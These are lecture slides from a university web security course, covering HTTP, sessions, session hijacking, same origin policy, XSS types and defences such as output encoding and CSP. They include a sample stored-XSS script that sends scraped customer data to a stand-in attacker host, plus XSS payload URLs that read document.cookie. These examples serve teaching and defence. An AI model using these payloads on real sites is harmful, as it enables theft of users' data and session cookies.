SMU Classification: Restricted

CS440
Foundations of Cybersecurity
Web Security – Part I

2

Recap Week 10

SMU Classification: Restricted

• Vulnerability: command injection, buffer overflow

• Countermeasures:

• Secure programming with good practice

• 3 System supports

• Language support

• Malware classification

• Malware analysis: static and dynamic

3

SMU Classification: Restricted

Overview

• Content

• Web architecture

• Sessions

• Session Attacks

• Same origin policy

• Cross site scripting (XSS): Stored XSS, Reflected XSS & DOM-based XSS

• After this module, you should be able to

• Understand what is sessions in the web

• Describe session attacks and how to prevent them

• Understand what is same origin policy and its use case

• Understand what is XSS and how to prevent them

4

Web Architecture

SMU Classification: Restricted

URL: Global Identifier (address) of a resource on the internet

abc.com/x.php?q=s

web page

HTML

JS

browser

HTTP request

web page

HTTP response

PHP

PHP

MySQL

web server

backend

HTTP: Application layer request-response protocol for distributed, collaborative, and hypermedia
information systems
• Widely used
• Simple
• Stateless
• Unencrypted

HTTPS Protocol: HTTP protocol with security extension, relying on SSL/TLS protocol in transport layer

5

URL

SMU Classification: Restricted

• Global Identifier (address) of a resource on the internet

• Example: https://smu.edu.sg/staff/faculty.php?user=lk%20shar#Faculty

• Protocol (scheme): https

• Host: smu.edu.sg

• Path: staff/faculty.php

• Query: user=lk shar, Fragment: Faculty

• Special characters are encoded (URL encoding) as hex:

• Newline as %0A

• Space as %20 or +

6

HTTP

SMU Classification: Restricted

• HTTP: Hypertext Transfer Protocol

• on top of TCP protocol, default port number: 80, text based

• Three Basic Features

• connectionless: the connection is closed if no response or request.

• media independent: any media can be sent as long as client and server know

how to handle.

• stateless: server and client are only aware of each other during the current

request.

https://www.tutorialspoint.com/http/http_overview.htm

7

SMU Classification: Restricted

HTTP Request

• Request line (method,

URI, protocol version)

• Zero or more header

• Empty line

• Message body (optional)

https://www.tutorialspoint.com/http/http_requests.htm

8

SMU Classification: Restricted

HTTP Response

• Status line (version, status

code)

• Zero or more header

• Empty line

• Message body (optional)

• Status code:

1xx: Informational
2xx: Success
3xx: Redirection
4xx: Client error
5xx: Server error

https://www.tutorialspoint.com/http/http_responses.htm

9

SMU Classification: Restricted

Sessions

1010

Sessions

SMU Classification: Restricted

• Stateless HTTP is not fit for modern Web applications, since users view the entire

browsing as ONE continuous and consistent process.

• For various business needs, web applications tend to maintain states by establishing

sessions.

• Web applications can establish sessions (shared state) between client and server,

and refer to this common state when authorising requests.

• Sessions between client and server are established through session identifiers

• Two ways of transferring session identifiers

11

Transferring Session Identifiers

SMU Classification: Restricted

• Cookie

• Session Identifier (SID) created and sent by server in a Set-Cookie header field in

the HTTP response

• browser stores cookie in document.cookie

• browser includes it in requests with a domain matching the cookie’s origin

• Hidden form field

• Server creates and includes SID in a hidden field of an HTML form in various web

pages

• e.g. <input type=‘hidden’ name=‘sid’ value=‘<SID_VALUE>’>

12

Establishing Session with Cookie

SMU Classification: Restricted

• Cookie is fetched by the browser and submitted to server.

Client

Web Server

Cookie

Local
Storage

See you
later!

It’s me again

Current connection
closes

A new HTTP
transaction using a
new connection starts

See you
later!

Sorry, do I
know u?

Yeah, you
are ...

Login successful?
1. Create SID and store in

database
Set SID and expiration
time in Cookie
Send Cookie to client

2.

3.

Session table
session_id
•
username
•
user_state
•

Database

1.
Is Cookie still valid (i.e. not expired yet)?
2. Does session id match the one stored in

database?
If both are yes, continue session

3.

1313

Session Identification v.s User Authentication

SMU Classification: Restricted

• Session identification and user-authentication are NOT the same.

• Session identification is basically for the functionality (i.e., state maintenance)

• User authentication is for security.

• But functionality is a bigger scope encompassing security. Whether a user is

authenticated is part of the session state.

• Server may issue SID with or without prior user authentication.

• Server may authenticate a user before the SID is issued and encode this fact

in the SID.

• SID is then used save future authentications in the same session.

Session state

authentication
status

14

Session Persistence

SMU Classification: Restricted

• Determined by the server

• Sessions can persist between login and logout

• Closing a window does not necessarily close a session to that web site; you

usually have to log out explicitly

• Sessions can persist for the duration of a business transaction

• Sessions can persist indefinitely

• Raises privacy issues when user’s surfing behavior can be tracked over an

extended period

15

SMU Classification: Restricted

Session Attacks

1616

Session Related Attacks

SMU Classification: Restricted

• When sessions entail privileges, e.g., because a ‘trusted’ user has been
authenticated, those privileges may be gained by session hijacking.

• Denial-of-Service: flooding attacks send many requests for session

establishment, exhausting resources at the receiver.

17

Example: Session Hijacking

SMU Classification: Restricted

• Attacker sends multiple

requests to the target server
• For each request, the server

sends back a Session ID
• The Session IDs are in

sequence

• A victim also connects to the

server and receives a Session
ID (the missing one in the list)

• By checking the missing

Session ID, attacker obtains the
victim’s Session ID

• Attacker then authenticates to

the server as the client,
hijacking the client’s session

A Shelly, et al. (2019). Using a Web Server Test Bed to Analyze the Limitations of Web Application
Vulnerability Scanners.

18

Session Hijacking: Cookie Poisoning

SMU Classification: Restricted

• Malicious client or outside attacker may use others’ SID (by guessing or stealing) to elevate

their permissions when SIDs are used for access control

A predictable session id can be
easily faked by attackers

(source: https://www.owasp.org/index.php/Session_Prediction)

19

Session ID Protection

SMU Classification: Restricted

• Use a large random SID (e.g., 20 bytes) instead of a predictable or

sequential SID

• Stored in a safe place in both client side and server side

• Deliver SID through an SSL/TLS connection

20

SMU Classification: Restricted

Same Origin Policy

2121

SMU Classification: Restricted

JavaScript & DOM

• Document Object Model (DOM):

• DOM is the hierarchical representation of data, used to manage state in modern

web browsers.

• JavaScript: programming language for client-side scripting in web browsers.

• A script may read/write DOM objects, request for network connection, read

cookies, access files, etc. It can do (almost) anything!

• A script can be executed upon loading or events.

For the sake of security, the browser must restrict JS
execution with access control.

22

Origin

SMU Classification: Restricted

• Definition of same-origin: two URLs have the same origin if the protocol,

port (if specified) and host are the same for both.

• it is referenced as the protocol/host/port tuple.

Example: with respect to http://store.company.com/dir/page.html

URL

Outcome

Reason

http://store.company.com/dir2/other.html

Same origin

Only the path differs

http://store.company.com/dir/inner/another.html

Same origin

Only the path differs

https://store.company.com/page.html

http://store.company.com:81/dir/page.html

http://news.company.com/dir/page.html

Failure

Failure

Failure

Different protocol

Different port (http:// is port
80 by default)

Different host

23

Same Origin Policy (SOP)

SMU Classification: Restricted

• SOP is the basic security mechanism dictating

that a document or script loaded from one origin
cannot (directly) interact with a resource from
another origin.

• It helps isolate potentially malicious documents,

reducing possible attack vectors.

• Resources: HTML DOM objects, cookies, network

requests, network replies

• SOP is enforced by all browsers.

• Cross-origin accesses undergo the browser’s

permission checking.

• E.g., a site has enabled the Cross-origin Resource

Sharing (CORS)

Web Page

script 1

r/w

Obj x

r/w/x

script 2

frame1

frame2

Obj a

Obj b

from origin 1

from origin 2

24

Site Isolation (Chrome)

SMU Classification: Restricted

• Site Isolation ensures that pages from

different websites are always put into different
processes, each running in a sandbox that
limits what the process is allowed to do.

• to leverage the underneath operating system

to enforce process-based isolation.

• It also makes it possible to block the process
from receiving certain types of sensitive data
from other sites.

• As a result, a malicious website will find it

much more difficult to steal data from other
sites

Cannot access cookies or network

access cookies or network

25

SMU Classification: Restricted

Cross-Site Scripting (XSS)

2626

Document Object Model (DOM)

SMU Classification: Restricted

• An HTML document can be viewed in the form of a tree. Building/modifying

an HTML document is to grow/trim the tree.

Text view

Tree view

<!DOCTYPE HTML>
<html>
<head>
  <title>About elk</title>
</head>
<body>
  <div>The truth about elk.</div>
</body>
</html>

Whenever the browser's rendering encounters the script
Whenever the browser's rendering encounters the script
tag, <script>, it automatically executes it.
tag, <script>, it automatically executes it.

27

Cross-Site Scripting (XSS)

SMU Classification: Restricted

• XSS attacks run a script in the browser that was not written by the web

application owner.

• The vulnerability is some of the most common vulnerabilities in the Internet.

• It is a special form of code injection!

• In general, XSS can be classified into

• Reflected XSS (Type-I)

• Stored XSS (Type-II)

• DOM-based XSS (Type-0)

OWSAP: Cross Site Scripting Prevention Cheat Sheet at here.

28

Stored XSS

SMU Classification: Restricted

• A.k.a. persistent XSS. It generally occurs when

user input is stored on the target server, such as in
a database, in a message forum, visitor log,
comment field, etc. And then a victim is able to
retrieve the stored data from the web application
without that data being made safe to render in the
browser.

• The form submitted by the attacker has the <script>
tag. The form is interpreted as text, and is deposited
to the database

• However, the the victim user views the data

retrieved from the database. Her browser treats the
tagged text as JavaScript code and executes it.

https://owasp.org/www-community/Types_of_Cross-Site_Scripting

29

Example: Malicious Customer Feedback

SMU Classification: Restricted

I am not happy with the service provided by your bank.
I have waited 12 hours for my deposit to show up in the web application. Please improve your web application.
Other banks will show deposits instantly.
<script>

/* Get a list of all customers from the page.*/
const customers = document.querySelectorAll('.openCases');
/* Iterate through each DOM element, collect privileged personal identifier information (PII) */
const customerData = [];
customers.forEach((customer) => { customerData.push(... )});
/* Build a new HTTP request, send stolen data to the hacker's own servers.*/
const http = new XMLHttpRequest();
http.open('POST', 'https://steal-your-data.com/data', true);http.setRequestHeader ('Contenttype’, 'application/json');

http.send(JSON.stringify(customerData);
</script>
—Unhappy Customer of Megabank

CS440: No requirement for JavaScript code understanding

3030

As a Result:

When the bank’s customer service
representative views the feedback, she
sees a common complain.

SMU Classification: Restricted

I am not happy with the service provided by your bank.
I have waited 12 hours for my deposit to show up in the
web application. Please improve your web application.
Other banks will show deposits instantly.
—Unhappy Customer

• But, the attacker’s script traverses the DOM using document.querySelector() and
steals privileged data that only she or MegaBank employee would have access to. The
script finds this data in the UI, convert it to a nice JSON for readability and easy
storage, and then send it back to his servers for use or sale at a later time.

•

It can do anything permitted by the representative’s browser.

3131

Stored XSS

SMU Classification: Restricted

• It is the most common type of XSS attacks.

• It may affect the most users, depending on who views the data
stored in the database

• E.g., a comment posted in a web forum is visible to everyone in the

Internet!

32

Stored XSS

SMU Classification: Restricted

33

SMU Classification: Restricted

Reflected XSS

• A.k.a. non-persistent XSS.

• Reflected XSS occurs when user input, which may contain a malicious script,

is immediately returned by a web application in an error message, search
result, or any other response that includes some or all of the input provided
by the user as part of the request, without that data being made safe to render
in the browser, and without permanently storing the user provided data.

34

Reflected XSS Vulnerability

SMU Classification: Restricted

• Potential Vulnerability: there could be a

correlation between the URL query
parameters and objects in the result page.

• Suppose a website has a search function
which receives the user-supplied search
term in a URL parameter:

https://insecure-bank.com/search?query=open+account

• The application echoes the supplied search

term in the response to this URL:

<p>You searched for: open account</p>

35

Reflected XSS Explained

SMU Classification: Restricted

• The attacker sends the malicious URL to the victim
user via email, web advertisement or other ways.

insecure-bank.com/search?query=open+<script>alert(test);</script>+account

• When the victim user clicks the URL, the server

returns the HTML page which echoes back the query
consisting of the JS code.

36

Reflected XSS

SMU Classification: Restricted

37

Reflected XSS vs Stored XSS

SMU Classification: Restricted

• By and large, Reflected XSS is better at avoiding detection than Stored XSS,

but is harder to distribute to a wide number of users.

• It can be launched to targeted users.

38

DOM-based XSS

SMU Classification: Restricted

• DOM Based XSS (a.k.a. “type-0 XSS”) is an XSS attack wherein the attack payload
is executed as a result of modifying the DOM “environment” in the victim’s browser
used by the original client side script, so that the client side code runs in an
“unexpected” manner.

• The page itself (i.e. the HTTP response) does not change, but the client side code

contained in the page executes differently due to the malicious modifications that have
occurred in the DOM environment.

• Both stored XSS and reflected XSS attacks require server-side flaws to inject

malicious code. But Dom-based XSS do not have that requirement.

browser

malicious input

source
dom

(data)

data flow

execute!

sink dom

(script)

https://owasp.org/www-community/attacks/DOM_Based_XSS

39

A simple example

SMU Classification: Restricted

insecure-bank.com/page.html#default=<script>alert(document.cookie);</script>

• Attacker sends the above URL to the victim who then clicks it.

• URI fragments (the part in the URI after the “#”) is not sent to the server by the browser.

• The web server only sees a request for page.html without any URL parameters.

• The response from the server does NOT consist of malicious script which manifests itself at

the client-side script at runtime.

• A flawed script in page.html accesses the DOM variable document.location and uses the

parameter for default to create a new DOM object.

• The new DOM object encloses <script>alert(document.cookie);</script>, which triggers the

browser to execute it.

40

Another example of DOM-XSS vulnerability

SMU Classification: Restricted

Suppose that a bank's web page has a
list of funds for user to choose. The page
provides searching, sorting and filtering
functions at the client side.

source

URL may contain malicious input

/* Grab the hash object #<x> from the URL. Find all matches with
the findNumberOfMatches() function, providing the hash value as
an input.*/
const hash = document.location.hash;
const funds = [];
const nMatches = findNumberOfMatches(funds, hash);
/*  Write the number of matches found, plus append the hash value
to the DOM to improve the user experience */
document.write(nMatches + ' matches found for ' + hash);

sink

malicious input (e.g.,
javascript code) from URL!

4141

Defence against XSS

SMU Classification: Restricted

• Two fundamental defence strategies:

• Filter server outputs / browser inputs : differentiate between HTML elements

(‘code’) and user data

• Clients can use safe JavaScript APIs or filter inputs ( e.g., !isNaN(input) )

• Servers can sanitize outputs, escape, encode dangerous characters ( e.g., < is converted

to "&lt;" ) – known as output encoding

• Improve access control -- XSS violates SOP (access control)

• Authenticate origin (back to cryptography stuff)

• Block execution of scripts in the browser altogether  most secure but not practical

• Authorize scripts explicitly (content security policy)

42

Strategy 1: Filtering

SMU Classification: Restricted

• Filtering is the current practice with some limitations.

• Limitation 1: Only works well if you have clear rules characterizing good/bad

inputs

• Limitation 2: Has to be tailored to a specific scenario; has to deal with

unspecified browser behavior

• Limitation 3: Scattered code. Input validation/output sanitization not centrally

enforceable

43

Strategy 2: Improve Access Control

SMU Classification: Restricted

• Authenticate origin:  not really used in practice. May be used some very

sensitive military applications

• Server could sign scripts (PKI); client needs public verification key

• Server could apply MAC to scripts; client needs secret key

• Browser, when rendering page from trusted server, checks that scripts are

authorized by trusted server

• Server could put authorized scripts in a specific directory and tell client about it

(Content Security Policy)

44

Blocking Script Execution & CSP

SMU Classification: Restricted

• Blocking all scripts seriously limits the web pages one can use today
• Block in-line scripts: Mozilla’s Content Security Policy

• All scripts for a page must be loaded from white-listed hosts

• Scripts included via a <script> tag pointing to a white-listed host will be treated as

valid

• Ignore all other scripts (including inline scripts and event-handling HTML

attributes).

• https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP

• Server tells browser how to distinguish between its own scripts and scripts

injected into its web pages

• Industry vibe: this approach looks promising

45

CSP-Example

SMU Classification: Restricted

46

SMU Classification: Restricted

Take Away

• HTTP is stateless protocol

• To establish states (e.g. to remember user’s actions), web applications create sessions

• based on cookies, session identifiers

• assume that communication (internet) is ‘secure’

• Sessions can be compromised at their endpoints

• Code and data (such as session id) at client side can be compromised and manipulated

• Same origin policy attempts to protect application payloads and session identifiers from

outside attackers (malicious websites)

• Yet, they can be stolen from the client via XSS

• The enemy is not a spy listening to your traffic but a hacker exploiting weak spots in browser

policies or vulnerabilities in Server programs!

47

SMU Classification: Restricted

Overview

• Content

• Web architecture

• Sessions

• Session Attacks

• Same origin policy

• Cross site scripting (XSS): Stored XSS, Reflected XSS & DOM-based XSS

• After this module, you should be able to

• Understand what is sessions in the web

• Describe session attacks and how to prevent them

• Understand what is same origin policy and its use case

• Understand what is XSS and how to prevent them

50


